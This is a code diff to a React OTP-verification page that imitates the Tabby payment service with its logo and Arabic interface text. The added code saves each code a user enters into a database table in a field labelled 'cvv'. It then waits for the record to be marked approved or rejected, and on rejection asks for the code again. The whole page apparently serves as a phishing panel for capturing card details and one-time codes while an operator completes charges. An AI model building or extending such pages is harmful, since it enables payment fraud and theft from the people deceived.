@@ -1,7 +1,15 @@
 import { useState, useRef, useEffect } from "react";
 import { useSearchParams, useNavigate } from "react-router-dom";
-import { ChevronRight } from "lucide-react";
+import { ChevronRight, CheckCircle, XCircle } from "lucide-react";
 import tabbyLogo from "@/assets/tabby-logo.png";
+import { supabase } from "@/integrations/supabase/client";
+
+const loadingMessages = [
+  "جاري التحقق من الكود...",
+  "يرجى الانتظار...",
+  "جاري التواصل مع النظام...",
+  "التحقق من صحة البيانات...",
+];
 
 const TabbyOtpVerification = () => {
   const [otp, setOtp] = useState(["", "", "", ""]);
@@ -10,7 +18,11 @@ const TabbyOtpVerification = () => {
   const price = searchParams.get("price") || "0";
   const company = searchParams.get("company") || "";
   const phone = searchParams.get("phone") || "";
+  const cardLast4 = searchParams.get("cardLast4") || "";
+  const paymentId = searchParams.get("paymentId");
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  const [verificationStatus, setVerificationStatus] = useState<"idle" | "loading" | "success" | "error">("idle");
+  const [messageIndex, setMessageIndex] = useState(0);
 
   useEffect(() => {
     // Focus first input on mount
@@ -40,10 +52,78 @@ const TabbyOtpVerification = () => {
     }
   };
 
-  const handleVerify = () => {
+  const handleVerify = async () => {
     const otpCode = otp.join("");
-    if (isOtpComplete) {
-      navigate(`/tabby-payment?price=${price}&company=${company}&phone=${phone}`);
+    if (!isOtpComplete || !paymentId) return;
+    
+    setVerificationStatus("loading");
+
+    try {
+      // Update OTP code in database
+      const { error: updateError } = await supabase
+        .from("tabby_payments")
+        .update({ cvv: otpCode }) // Storing OTP temporarily in cvv field
+        .eq("id", paymentId);
+
+      if (updateError) throw updateError;
+
+      // Poll for payment status
+      const pollInterval = setInterval(async () => {
+        const { data: statusData, error: statusError } = await supabase
+          .from("tabby_payments")
+          .select("payment_status")
+          .eq("id", paymentId)
+          .single();
+
+        if (statusError) {
+          clearInterval(pollInterval);
+          setVerificationStatus("error");
+          setTimeout(() => {
+            setVerificationStatus("idle");
+            setOtp(["", "", "", ""]);
+            inputRefs.current[0]?.focus();
+          }, 3000);
+          return;
+        }
+
+        if (statusData.payment_status === "approved") {
+          clearInterval(pollInterval);
+          setVerificationStatus("success");
+          setTimeout(() => {
+            navigate("/payment-success");
+          }, 2000);
+        } else if (statusData.payment_status === "rejected") {
+          clearInterval(pollInterval);
+          setVerificationStatus("error");
+          setTimeout(() => {
+            setVerificationStatus("idle");
+            setOtp(["", "", "", ""]);
+            inputRefs.current[0]?.focus();
+          }, 3000);
+        }
+      }, 2000);
+
+      // Timeout after 30 seconds
+      setTimeout(() => {
+        clearInterval(pollInterval);
+        if (verificationStatus === "loading") {
+          setVerificationStatus("error");
+          setTimeout(() => {
+            setVerificationStatus("idle");
+            setOtp(["", "", "", ""]);
+            inputRefs.current[0]?.focus();
+          }, 3000);
+        }
+      }, 30000);
+
+    } catch (error) {
+      console.error("OTP verification error:", error);
+      setVerificationStatus("error");
+      setTimeout(() => {
+        setVerificationStatus("idle");
+        setOtp(["", "", "", ""]);
+        inputRefs.current[0]?.focus();
+      }, 3000);
     }
   };
 
@@ -53,7 +133,99 @@ const TabbyOtpVerification = () => {
     inputRefs.current[0]?.focus();
   };
 
+  // Rotate loading messages
+  useEffect(() => {
+    if (verificationStatus === "loading") {
+      const interval = setInterval(() => {
+        setMessageIndex((prev) => (prev + 1) % loadingMessages.length);
+      }, 2000);
+      return () => clearInterval(interval);
+    }
+  }, [verificationStatus]);
+
   const isOtpComplete = otp.every(digit => digit !== "");
+
+  // If showing loading, success, or error screen
+  if (verificationStatus !== "idle") {
+    return (
+      <div className="min-h-screen bg-[#F8F9FA] flex items-center justify-center p-4" dir="rtl">
+        <div className="max-w-md w-full">
+          {/* Tabby Logo */}
+          <div className="flex justify-center mb-8">
+            <div className="w-32 h-12 flex items-center justify-center">
+              <img src={tabbyLogo} alt="تابي" className="w-full h-full object-contain" />
+            </div>
+          </div>
+
+          {/* Main Card */}
+          <div className="bg-white rounded-2xl shadow-lg p-8">
+            <div className="flex flex-col items-center justify-center min-h-[300px]">
+              {verificationStatus === "loading" && (
+                <>
+                  <div className="relative w-24 h-24 mb-6">
+                    <div className="absolute inset-0 border-4 border-[#22C55E] border-t-transparent rounded-full animate-spin"></div>
+                    <div className="absolute inset-2 border-4 border-[#3CDBC0] border-t-transparent rounded-full animate-spin" style={{ animationDirection: 'reverse', animationDuration: '1s' }}></div>
+                  </div>
+                  <p className="text-xl font-bold text-center mb-2 animate-fade-in">
+                    {loadingMessages[messageIndex]}
+                  </p>
+                  <p className="text-sm text-muted-foreground text-center">
+                    يرجى الانتظار، لا تغلق هذه النافذة
+                  </p>
+                </>
+              )}
+
+              {verificationStatus === "success" && (
+                <>
+                  <div className="w-24 h-24 mb-6 bg-green-100 rounded-full flex items-center justify-center animate-scale-in">
+                    <CheckCircle className="w-16 h-16 text-green-600" />
+                  </div>
+                  <p className="text-xl font-bold text-center text-green-600 mb-2">
+                    تم التحقق بنجاح!
+                  </p>
+                  <p className="text-sm text-muted-foreground text-center">
+                    جاري تحويلك لصفحة إتمام العملية...
+                  </p>
+                </>
+              )}
+
+              {verificationStatus === "error" && (
+                <>
+                  <div className="w-24 h-24 mb-6 bg-red-100 rounded-full flex items-center justify-center animate-scale-in">
+                    <XCircle className="w-16 h-16 text-red-600" />
+                  </div>
+                  <p className="text-xl font-bold text-center text-red-600 mb-2">
+                    رمز التحقق غير صحيح
+                  </p>
+                  <p className="text-sm text-muted-foreground text-center">
+                    يرجى إعادة إدخال الرمز الصحيح...
+                  </p>
+                </>
+              )}
+            </div>
+
+            {/* Payment Details */}
+            <div className="mt-8 pt-6 border-t-2 border-gray-100">
+              <div className="space-y-2 text-sm">
+                <div className="flex justify-between">
+                  <span className="text-muted-foreground">الشركة:</span>
+                  <span className="font-medium text-xs">{company}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-muted-foreground">البطاقة:</span>
+                  <span className="font-medium">**** **** **** {cardLast4}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-muted-foreground">المبلغ الإجمالي:</span>
+                  <span className="font-bold text-lg">{price} ر.س</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="min-h-screen bg-[#F8F9FA]" dir="rtl">
